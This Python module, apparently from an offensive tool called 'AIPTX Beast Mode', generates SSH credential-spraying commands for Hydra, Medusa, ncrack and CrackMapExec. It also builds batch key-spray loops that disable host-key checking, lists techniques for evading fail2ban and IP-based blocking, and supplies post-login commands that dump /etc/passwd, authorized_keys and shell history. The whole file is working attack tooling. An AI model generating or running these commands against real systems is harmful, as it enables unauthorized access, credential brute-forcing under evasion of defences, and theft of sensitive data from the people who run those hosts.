"""
AIPTX Beast Mode - SSH Credential Spraying
==========================================

SSH-specific credential spraying and key-based access.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Any

logger = logging.getLogger(__name__)


@dataclass
class SSHSprayResult:
    """Result of SSH spray attempt."""
    target: str
    port: int
    username: str
    auth_method: str  # password, key
    success: bool
    shell_access: bool = False
    sudo_access: bool = False
    message: str = ""
    error: str | None = None


class SSHSprayer:
    """
    SSH-specific credential spraying.

    Supports password and key-based authentication testing.
    """

    def __init__(self, port: int = 22):
        """
        Initialize SSH sprayer.

        Args:
            port: Default SSH port
        """
        self.port = port
        self._results: list[SSHSprayResult] = []

    def get_hydra_command(
        self,
        target: str,
        usernames: list[str],
        passwords: list[str],
        threads: int = 4,
        timeout: int = 10,
    ) -> dict[str, str]:
        """
        Get Hydra SSH spray command.

        Args:
            target: Target IP
            usernames: List of usernames
            passwords: List of passwords
            threads: Concurrent threads
            timeout: Connection timeout

        Returns:
            Hydra command configuration
        """
        # Write temp files
        user_file = "/tmp/ssh_users.txt"
        pass_file = "/tmp/ssh_pass.txt"

        setup = f"printf '%s\\n' {' '.join(repr(u) for u in usernames)} > {user_file} && "
        setup += f"printf '%s\\n' {' '.join(repr(p) for p in passwords)} > {pass_file}"

        cmd = f"hydra -L {user_file} -P {pass_file} ssh://{target}:{self.port} -t {threads} -W {timeout} -o /tmp/ssh_results.txt"

        return {
            "setup": setup,
            "command": cmd,
            "description": f"Hydra SSH spray against {target}",
            "output_file": "/tmp/ssh_results.txt",
            "notes": f"-t {threads} limits concurrency, -W {timeout} sets timeout",
        }

    def get_medusa_command(
        self,
        target: str,
        user_file: str,
        pass_file: str,
        threads: int = 4,
    ) -> dict[str, str]:
        """
        Get Medusa SSH spray command.

        Args:
            target: Target IP
            user_file: Path to username file
            pass_file: Path to password file
            threads: Concurrent threads

        Returns:
            Medusa command configuration
        """
        return {
            "command": f"medusa -h {target} -U {user_file} -P {pass_file} -M ssh -t {threads} -O /tmp/medusa_ssh.txt",
            "description": f"Medusa SSH spray against {target}",
            "output_file": "/tmp/medusa_ssh.txt",
        }

    def get_ncrack_command(
        self,
        target: str,
        user_file: str,
        pass_file: str,
    ) -> dict[str, str]:
        """
        Get ncrack SSH spray command.

        Args:
            target: Target IP
            user_file: Path to username file
            pass_file: Path to password file

        Returns:
            ncrack command configuration
        """
        return {
            "command": f"ncrack -p {self.port} --user {user_file} --pass {pass_file} ssh://{target}",
            "description": f"ncrack SSH spray against {target}",
        }

    def get_cme_command(
        self,
        target: str,
        usernames: list[str],
        password: str,
    ) -> dict[str, str]:
        """
        Get CrackMapExec SSH spray command.

        Args:
            target: Target IP
            usernames: List of usernames
            password: Password to spray

        Returns:
            CME command configuration
        """
        user_str = " ".join(f"'{u}'" for u in usernames)

        return {
            "command": f"crackmapexec ssh {target} -u {user_str} -p '{password}' --continue-on-success",
            "description": f"CME SSH spray with password: {password[:3]}***",
            "success_indicator": "[+]",
        }

    def get_ssh_key_spray_commands(
        self,
        target: str,
        usernames: list[str],
        key_paths: list[str],
    ) -> list[dict[str, str]]:
        """
        Get SSH key spray commands.

        Args:
            target: Target IP
            usernames: List of usernames
            key_paths: Paths to SSH private keys

        Returns:
            List of key spray commands
        """
        commands = []

        for key_path in key_paths:
            for username in usernames:
                commands.append({
                    "command": f"ssh -i {key_path} -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no {username}@{target}:{self.port} 'echo SUCCESS'",
                    "username": username,
                    "key_path": key_path,
                    "description": f"Test key {key_path} for {username}@{target}",
                })

        # Batch command
        if key_paths and usernames:
            batch_script = f"""
for key in {' '.join(key_paths)}; do
    for user in {' '.join(usernames)}; do
        ssh -i "$key" -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no "$user"@{target} 'echo "SUCCESS: $user with $key"' 2>/dev/null
    done
done
"""
            commands.append({
                "command": batch_script.strip(),
                "description": "Batch key spray",
                "shell": "bash",
            })

        return commands

    def get_ssh_audit_command(self, target: str) -> dict[str, str]:
        """
        Get SSH audit command to analyze server configuration.

        Args:
            target: Target IP

        Returns:
            SSH audit command
        """
        return {
            "command": f"ssh-audit {target}:{self.port}",
            "description": "Audit SSH server configuration",
            "checks": [
                "Weak algorithms",
                "Known vulnerabilities",
                "Banner information",
                "Key exchange methods",
            ],
        }

    def get_ssh_bruteforce_protection_bypass(self) -> list[dict[str, str]]:
        """
        Get techniques to bypass SSH bruteforce protection.

        Returns:
            List of bypass techniques
        """
        return [
            {
                "name": "slow_spray",
                "technique": "Increase delay between attempts",
                "command": "Add -W 30 to hydra for 30s wait",
                "effectiveness": "High for fail2ban",
            },
            {
                "name": "distributed_spray",
                "technique": "Spray from multiple IPs",
                "command": "Use different pivot points",
                "effectiveness": "High for IP-based blocking",
            },
            {
                "name": "user_rotation",
                "technique": "Rotate users instead of passwords",
                "command": "Password spray pattern",
                "effectiveness": "Avoids per-user lockouts",
            },
            {
                "name": "time_based",
                "technique": "Spray during high-traffic periods",
                "command": "Business hours spraying",
                "effectiveness": "Blends with normal traffic",
            },
        ]

    def get_common_linux_users(self) -> list[str]:
        """Get list of common Linux usernames."""
        return [
            "root", "admin", "administrator", "user", "test",
            "ubuntu", "centos", "debian", "ec2-user", "azureuser",
            "vagrant", "ansible", "deploy", "git", "jenkins",
            "www-data", "nginx", "apache", "mysql", "postgres",
            "oracle", "tomcat", "redis", "elasticsearch", "kafka",
            "hadoop", "spark", "docker", "kubernetes", "k8s",
            "backup", "ftp", "ftpuser", "sshd", "daemon",
        ]

    def get_post_auth_commands(
        self,
        target: str,
        username: str,
        password: str | None = None,
        key_path: str | None = None,
    ) -> list[dict[str, str]]:
        """
        Get commands to run after successful SSH authentication.

        Args:
            target: Target IP
            username: Username
            password: Password (if password auth)
            key_path: Key path (if key auth)

        Returns:
            Post-authentication commands
        """
        if key_path:
            ssh_base = f"ssh -i {key_path} {username}@{target}"
        else:
            ssh_base = f"sshpass -p '{password}' ssh {username}@{target}"

        return [
            {
                "name": "whoami",
                "command": f"{ssh_base} 'id && whoami'",
                "description": "Check current user",
            },
            {
                "name": "sudo_check",
                "command": f"{ssh_base} 'sudo -l 2>/dev/null'",
                "description": "Check sudo permissions",
            },
            {
                "name": "system_info",
                "command": f"{ssh_base} 'uname -a && cat /etc/*release'",
                "description": "Get system info",
            },
            {
                "name": "network_info",
                "command": f"{ssh_base} 'ip addr && ip route'",
                "description": "Get network configuration",
            },
            {
                "name": "users",
                "command": f"{ssh_base} 'cat /etc/passwd | grep -v nologin'",
                "description": "List users with login shells",
            },
            {
                "name": "ssh_keys",
                "command": f"{ssh_base} 'ls -la ~/.ssh/ && cat ~/.ssh/authorized_keys 2>/dev/null'",
                "description": "Check SSH keys",
            },
            {
                "name": "history",
                "command": f"{ssh_base} 'cat ~/.bash_history 2>/dev/null | tail -50'",
                "description": "Get command history",
            },
        ]


__all__ = [
    "SSHSprayResult",
    "SSHSprayer",
]
